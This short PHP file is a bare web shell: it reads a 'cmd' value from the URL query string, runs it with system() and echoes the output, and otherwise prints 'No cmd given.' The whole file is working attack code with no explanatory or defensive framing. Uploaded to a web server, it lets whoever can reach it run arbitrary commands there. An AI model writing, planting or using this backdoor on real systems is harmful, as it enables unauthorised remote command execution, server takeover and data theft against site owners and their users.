<?php
    if ( isset($_GET['cmd']) ) {
        echo "<pre>";
        echo system($_GET['cmd']);
        echo "</pre>";
        exit();
    }
    else {
        echo "<p>";
        echo "No cmd given.";
        echo  "</p>";
        exit();
    }
?>
